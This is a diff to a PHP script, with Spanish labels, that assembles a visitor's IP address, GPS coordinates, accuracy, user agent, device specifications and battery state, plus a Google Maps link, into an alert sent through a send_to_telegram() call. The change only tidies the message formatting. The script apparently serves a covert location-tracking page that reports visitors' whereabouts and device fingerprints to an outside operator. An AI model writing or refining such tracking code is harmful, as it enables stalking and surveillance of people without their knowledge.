@@ -23,20 +23,24 @@ $ip = get_client_ip();
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $ts = gmdate('c');
 
-$msg = "📍 <b>Nueva ubicación</b>\n".
-       "🌐 IP: $ip\n".
-       "📌 Lat: $lat\n".
-       "📌 Lon: $lon\n".
-       "🎯 Precisión: {$acc}m\n".
-       "🖥️ UA: $ua\n".
-       "💻 Plataforma: {$device['platform']}\n".
-       "🖥️ Arquitectura: {$device['architecture']}\n".
-       "🧠 Núcleos: {$device['cores']}\n".
-       "💾 Memoria: {$device['memory']} GB\n".
-       "🔋 Batería: ".($device['batteryLevel'] ?? 'Desconocida')."\n".
-       "⚡ Cargando: ".(($device['charging'] ?? false) ? 'Sí' : 'No')."\n".
-       "⏰ Hora: $ts".
-       "Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";
+$msg = "📍 <b>Nueva ubicación</b>\n";
+
+if (!empty($ip)) $msg .= "🌐 IP: $ip\n";
+if (!empty($lat)) $msg .= "📌 Lat: $lat\n";
+if (!empty($lon)) $msg .= "📌 Lon: $lon\n";
+if (!empty($acc)) $msg .= "🎯 Precisión: {$acc}m\n";
+if (!empty($ua)) $msg .= "🖥️ UA: $ua\n";
+
+if (!empty($device['platform'])) $msg .= "💻 Plataforma: {$device['platform']}\n";
+if (!empty($device['architecture'])) $msg .= "🖥️ Arquitectura: {$device['architecture']}\n";
+if (!empty($device['cores'])) $msg .= "🧠 Núcleos: {$device['cores']}\n";
+if (!empty($device['memory'])) $msg .= "💾 Memoria: {$device['memory']} GB\n";
+if (isset($device['batteryLevel'])) $msg .= "🔋 Batería: {$device['batteryLevel']}\n";
+if (isset($device['charging'])) $msg .= "⚡ Cargando: " . ($device['charging'] ? 'Sí' : 'No') . "\n";
+
+$msg .= "⏰ Hora: $ts\n";
+
+if (!empty($lat) && !empty($lon)) $msg .= "🌍 Google Maps: https://www.google.com/maps?q={$lat},{$lon}\n";
 
 send_to_telegram($msg);
 
